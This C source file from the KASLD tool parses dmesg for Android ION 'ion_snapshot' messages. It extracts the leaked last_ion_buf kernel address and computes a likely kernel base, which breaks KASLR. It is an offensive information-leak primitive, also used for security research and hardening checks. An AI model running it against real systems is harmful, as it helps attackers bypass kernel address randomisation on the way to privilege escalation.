// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for Android ION ion_snapshot map message which
// prints last_ion_buf symbol address:
//
//   ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374
//
// Android ION drivers were removed in kernel v5.11-rc1.
//
// Leak primitive:
//   Data leaked:      kernel symbol address (last_ion_buf) and virtual mapping
//   Kernel subsystem: drivers/staging/android/ion — ion_snapshot()
//   Data structure:   ion_snapshot map address (kernel virtual pointer)
//   Address type:     virtual
//   Method:           parsed (dmesg string)
//   Status:           removed in v5.11 (Android ION subsystem deleted)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v5.10.89/source/drivers/staging/android/ion
//
// Mitigations:
//   Android ION was removed in v5.11. Access gated by dmesg_restrict
//   (see dmesg.h for shared access gate details).
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://lwn.net/Articles/576966/
// https://lwn.net/Articles/565469/
// https://lwn.net/Articles/480055/
// https://elixir.bootlin.com/linux/v5.10.89/source/drivers/staging/android/ion
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Searches dmesg for Android ION ion_snapshot messages that print "
    "the last_ion_buf symbol virtual address. The ION memory allocator "
    "was removed from mainline in v5.11. Access is gated by "
    "dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;
  const char *needle2 = "and copy to 0x";

  /* ion_snapshot: 0x7e9d0000 map to 0xe0907000 and copy to 0xc0e5d374 */
  const char *p = strstr(line, needle2);
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + strlen(needle2), &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    *result = addr;
    return 0;
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for 'ion_snapshot: ' ...\n");
  int ds = dmesg_search("ion_snapshot: ", on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] ion_snapshot not found in dmesg\n");
    return 0;
  }

  printf("leaked last_ion_buf: %lx\n", addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, "last_ion_buf");
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
